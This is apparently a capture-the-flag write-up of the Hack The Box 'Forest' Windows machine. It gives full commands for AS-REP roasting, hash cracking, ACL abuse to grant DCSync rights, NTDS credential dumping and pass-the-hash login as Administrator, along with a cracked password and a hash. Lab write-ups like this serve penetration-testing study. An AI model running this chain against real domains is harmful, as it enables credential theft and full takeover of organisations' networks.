---
title: "HTB Forest"
date: 2026-05-15 03.47 +0100
categories: [CPTS Preparation]
tags: [HTB, Machine, Windows, Easy]
image: /assets/img/posts/forest/forest.png
---
**HTB Forest** is a Windows `Active Directory` machine that starts with unauthenticated `LDAP` and `SMB` null session enumeration to harvest usernames, performs `AS-REP Roasting` to obtain and crack a hash for `svc-alfresco`, leverages `BloodHound` to identify an `Account Operators` group membership path, creates a new user and adds them to `Exchange Trusted Subsystem` to inherit `WriteDACL` rights, grants `DCSync` privileges via `PowerView`, and dumps the `NTDS` to achieve full `Domain Administrator` access.
## Reconnaissance
### Scanning
- Nmap (All ports)
```
nmap -p- 10.129.95.210 -nv --min-rate 1000
```
```
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49680/tcp open  unknown
49681/tcp open  unknown
49685/tcp open  unknown
49700/tcp open  unknown
49818/tcp open  unknown
```
- NSE Scripts & Version
```
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49680,49681,49685,49700,49818 10.129.95.210 -nv --min-rate 1000
```
```
PORT      STATE SERVICE      VERSION                                                                                                                         
53/tcp    open  domain       Simple DNS Plus                                                                                                                 
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-05-15 15:20:46Z)                                                                  
135/tcp   open  msrpc        Microsoft Windows RPC                                                                                                           
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                                                   
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)                                      
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)                                                                
464/tcp   open  kpasswd5?                                                                                                                                    
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0                                                                                             
636/tcp   open  tcpwrapped                                                                                                                                   
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)                                      
3269/tcp  open  tcpwrapped                                                                                                                                   
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                         
|_http-title: Not Found                                                                                                                                      
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                  
9389/tcp  open  mc-nmf       .NET Message Framing                                                                                                            
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                         
|_http-title: Not Found                                                                                                                                      
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                  
49664/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49665/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49666/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49668/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49670/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49680/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0                                                                                             
49681/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49685/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49700/tcp open  msrpc        Microsoft Windows RPC                                                                                                           
49818/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:                                                                                                                                         
| smb2-security-mode:                                                                                                                                        
|   3.1.1:                                                                                                                                                   
|_    Message signing enabled and required                                                                                                                   
| smb-os-discovery:                                                                                                                                          
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)                                                                                
|   Computer name: FOREST                                                                                                                                    
|   NetBIOS computer name: FOREST\x00                                                                                                                        
|   Domain name: htb.local                                                                                                                                   
|   Forest name: htb.local                                                                                                                                   
|   FQDN: FOREST.htb.local                                                                                                                                   
|_  System time: 2026-05-15T08:21:44-07:00                                                                                                                   
| smb-security-mode:                                                                                                                                         
|   account_used: <blank>                                                                                                                                    
|   authentication_level: user                                                                                                                               
|   challenge_response: supported                                                                                                                            
|_  message_signing: required                                                                                                                                
| smb2-time:                                                                                                                                                 
|   date: 2026-05-15T15:21:41                                                                                                                                
|_  start_date: 2026-05-15T14:51:49                                                                                                                          
|_clock-skew: mean: 2h26m48s, deviation: 4h02m31s, median: 6m47s
```
### Configuration
- /etc/hosts
```
sudo nxc smb 10.129.95.210 --generate-hosts-file /etc/hosts
```
- /etc/krb5.conf
```
sudo nxc smb FOREST.htb.local --generate-krb5-file /etc/krb5.conf
```
- time
```
sudo ntpdate -u FOREST.htb.local
```
### Enumeration
- SMB (Null Session)
```
➜  forest nxc smb FOREST.htb.local -u '' -p ''
SMB         10.129.95.210   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.95.210   445    FOREST           [+] htb.local\:
```
- LDAP (Null Session)
```
➜  forest nxc ldap FOREST.htb.local -u '' -p ''       
LDAP        10.129.95.210   389    FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) (signing:None) (channel binding:No TLS cert)
LDAP        10.129.95.210   389    FOREST           [+] htb.local\:
```
- ASREP
```
impacket-GetNPUsers -request -dc-ip 10.129.95.210 'htb.local/' -format hashcat -outputfile hash.txt
```
- hashcat
```
hashcat -a 0 -m 18200 hash.txt rockyou.txt -d 1 -O
```
```
svc-alfresco:s3rvice
```
### Shell as svc-alferesco
```
➜  forest nxc winrm FOREST.htb.local -u 'svc-alfresco' -p 's3rvice'           
WINRM       10.129.95.210   5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local) 
WINRM       10.129.95.210   5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
➜  forest evil-winrm -i FOREST.htb.local -u 'svc-alfresco' -p 's3rvice'
```
## Rusthound
### Collection
```
rusthound-ce --domain htb.local -u 'svc-alfresco' -p 's3rvice' -z
```
### svc-alferesco ➜ FOREST.HTB.LOCAL
![dcsync](/assets/img/posts/forest/dcsync.png)
The **Account Operators** group in Microsoft Windows is a specialized Active Directory group used to `manage` **user** and **group** objects within a domain. Members can **create**, **delete**, and **modify** user accounts and group properties, but they cannot change the membership or rights of built-in groups.

Key points:
- Members can create, delete, and modify user accounts and group properties.
- The group is intended for specific delegated tasks, not general administration.
- Microsoft recommends keeping the group empty when possible and using the Delegation of Control Wizard for finer-grained permissions.
![dcsync2](/assets/img/posts/forest/dcsync2.png)
```
net user hoxon P@ssword123! /add /domain
net group "Exchange Trusted Subsystem" hoxon /add /domain
```
```powershell
Import-Module ./powerview.ps1
$pass = ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('htb.local\hoxon', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity hoxon -Rights DCSync
```
```
impacket-secretsdump htb.local/hoxon:'P@ssword123!'@FOREST.htb.local -just-dc -dc-ip 10.129.95.210
```
```
evil-winrm -i FOREST.htb.local -u 'Administrator' -H '32693b11e6aa90eb43d32c72a07ceea6'
```
